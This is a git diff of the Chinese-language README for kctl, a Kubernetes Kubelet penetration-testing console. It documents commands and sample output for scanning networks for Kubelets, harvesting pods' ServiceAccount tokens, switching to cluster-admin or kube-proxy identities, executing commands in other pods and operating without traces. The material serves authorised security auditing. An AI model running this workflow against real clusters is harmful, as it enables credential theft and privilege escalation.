@@ -1,10 +1,47 @@
-# kctl
+<p align="center">
+  <img src="https://img.shields.io/github/v/release/kinopio1101/kctl?color=%2300ADD8&label=release&logo=github&logoColor=white" alt="GitHub Release">
+  <img src="https://img.shields.io/badge/Go-1.24+-00ADD8?logo=go&logoColor=white" alt="Go Version">
+  <a href="https://github.com/kinopio1101/kctl/blob/main/LICENSE">
+    <img src="https://img.shields.io/badge/License-MIT-E11311.svg" alt="MIT License">
+  </a>
+  <a href="https://github.com/kinopio1101/kctl/issues">
+    <img src="https://img.shields.io/github/issues/kinopio1101/kctl?color=%23F97316&logo=github" alt="GitHub Issues">
+  </a>
+  <a href="https://github.com/kinopio1101/kctl/stargazers">
+    <img src="https://img.shields.io/github/stars/kinopio1101/kctl?color=%23FBBF24&logo=github" alt="GitHub Stars">
+  </a>
+</p>
 
-Kubernetes Kubelet Security Audit Tool - 专用于 Kubelet 节点的安全审计与渗透测试
+<p align="center">
+  <a href="./README.en.md"><img alt="README in English" src="https://img.shields.io/badge/English-d9d9d9"></a>
+  <a href="./README.md"><img alt="简体中文版自述文件" src="https://img.shields.io/badge/简体中文-d9d9d9"></a>
+</p>
+
+<h1 align="center">kctl</h1>
+
+<h4 align="center">Kubernetes Kubelet Security Audit Tool - 专用于 Kubelet 节点的安全审计与渗透测试</h4>
+
+<p align="center">
+  <a href="#功能概览">功能概览</a> •
+  <a href="#快速开始">快速开始</a> •
+  <a href="#控制台命令">命令</a> •
+  <a href="#实战案例nodes-proxy-权限提权">攻击案例</a> •
+  <a href="#防御建议">防御</a>
+</p>
+
+---
 
 ## 功能概览
 
 kctl 是一个轻量级的 Kubernetes 安全审计工具，专门针对 Kubelet API 进行安全评估和权限分析。设计用于渗透测试场景，支持在 Pod 内运行时自动检测环境并进行横向移动。
+
+### 核心特性
+
+- **网段扫描**：扫描网段发现 Kubelet 节点
+- **SA 权限分析**：扫描所有 Pod 的 ServiceAccount Token 权限
+- **风险评估**：自动识别高危权限（cluster-admin、nodes/proxy 等）
+- **横向移动**：利用 Kubelet API 在 Pod 间执行命令
+- **无痕操作**：所有数据缓存在内存中，退出时自动清除
 
 ## 快速开始
 
@@ -58,39 +95,106 @@ kctl [default/attacker CRITICAL]>
 | 命令 | 说明 |
 |------|------|
 | `help` | 显示帮助信息 |
-| `connect` | 连接到 Kubelet |
-| `scan` | 扫描所有 Pod 的 SA 权限 |
-| `sa` | 列出已扫描的 ServiceAccount |
+| `discover <target>` | 扫描网段发现 Kubelet 节点 |
+| `connect [ip]` | 连接到 Kubelet（可选，命令会自动连接） |
+| `sa` | ServiceAccount 相关操作 |
+| `sa list` | 列出已扫描的 SA |
+| `sa scan` | 扫描所有 Pod 的 SA 权限 |
+| `sa use <ns/name>` | 切换到指定的 SA |
+| `sa info` | 显示当前 SA 详情 |
 | `pods` | 列出节点上的 Pod |
-| `use <ns/name>` | 切换到指定的 ServiceAccount |
-| `info` | 显示当前 SA 的详细信息 |
 | `exec` | 在 Pod 中执行命令 |
 | `set <key> <value>` | 设置配置项 |
 | `show options` | 显示当前配置 |
 | `show status` | 显示会话状态 |
+| `show kubelets` | 显示发现的 Kubelet 节点 |
 | `export json/csv` | 导出扫描结果 |
 | `clear` | 清除缓存 |
 | `exit` | 退出控制台 |
 
+### discover 命令 - 网段扫描
+
+扫描网段发现 Kubelet 节点：
+
+```bash
+# 扫描 CIDR 网段
+discover 10.0.0.0/24
+
+# 扫描 IP 范围
+discover 10.0.0.1-254
+
+# 指定端口和并发数
+discover 10.0.0.0/24 -p 10250,10255 -c 200
+
+# 显示所有开放端口（不仅是 Kubelet）
+discover 10.0.0.0/24 --all
+```
+
+输出示例：
+```
+[*] Scanning 10.0.0.0/24:10250 (254 targets, 100 concurrent)
+[========================================] 100% (254/254)
+[*] Validating Kubelet endpoints...
+
++-------------+-------+------------+
+| IP          | PORT  | HEALTH     |
++-------------+-------+------------+
+| 10.0.0.1    | 10250 | /healthz   |
+| 10.0.0.5    | 10250 | /healthz   |
++-------------+-------+------------+
+
+[+] Scan complete in 3.2s: 3 open ports, 2 Kubelet nodes
+[*] Use 'set target <ip>' to select target
+[*] Use 'show kubelets' to view cached results
+```
+
+### sa 命令 - ServiceAccount 操作
+
+```bash
+# 列出所有 SA（默认）
+sa
+
+# 列出有风险的 SA
+sa list --risky
+
+# 只显示 cluster-admin
+sa list --admin
+
+# 扫描所有 Pod 的 SA Token
+sa scan
+
+# 扫描并只显示有风险的
+sa scan --risky
+
+# 选择 SA
+sa use kube-system/cluster-admin
+
+# 显示当前 SA 详情
+sa info
+```
+
 ### 典型工作流程
 
 ```bash
-# 1. 进入控制台（自动连接并检查当前 SA 权限）
-kctl [default/attacker CRITICAL]> info
+# 1. 扫描网段发现 Kubelet 节点
+kctl [default]> discover 10.0.0.0/24
 
-# 2. 扫描节点上所有 Pod 的 SA 权限
-kctl [default/attacker CRITICAL]> scan
+# 2. 选择目标
+kctl [default]> set target 10.0.0.5
 
-# 3. 查看高权限 SA
-kctl [default/attacker CRITICAL]> sa --admin
+# 3. 扫描节点上所有 Pod 的 SA 权限
+kctl [default]> sa scan
 
-# 4. 切换到高权限 SA
-kctl [default/attacker CRITICAL]> use kube-system/cluster-admin
+# 4. 查看高权限 SA
+kctl [default]> sa list --admin
 
-# 5. 查看新身份的权限
-kctl [kube-system/cluster-admin ADMIN]> info
+# 5. 切换到高权限 SA
+kctl [default]> sa use kube-system/cluster-admin
 
-# 6. 使用新身份执行命令
+# 6. 查看新身份的权限
+kctl [kube-system/cluster-admin ADMIN]> sa info
+
+# 7. 使用新身份执行命令
 kctl [kube-system/cluster-admin ADMIN]> exec -it
 ```
 
@@ -152,7 +256,7 @@ kctl [default/attacker HIGH]>
 #### 步骤 2：查看当前权限
 
 ```
-kctl [default/attacker HIGH]> info
+kctl [default/attacker HIGH]> sa info
 
   ServiceAccount Information
   ─────────────────────────────────────────
@@ -170,7 +274,7 @@ kctl [default/attacker HIGH]> info
 #### 步骤 3：扫描节点上的所有 Pod
 
 ```
-kctl [default/attacker HIGH]> scan
+kctl [default/attacker HIGH]> sa scan
 
 [*] Scanning ServiceAccount tokens...
 [*] Found 15 pods with SA tokens
@@ -211,7 +315,7 @@ kctl [default/attacker HIGH]> exec -n kube-system kube-proxy-xxxxx -- cat /var/r
 #### 步骤 5：切换到高权限身份
 
 ```
-kctl [default/attacker HIGH]> use kube-system/kube-proxy
+kctl [default/attacker HIGH]> sa use kube-system/kube-proxy
 
 [+] Switched to kube-system/kube-proxy
 [*] Checking permissions...
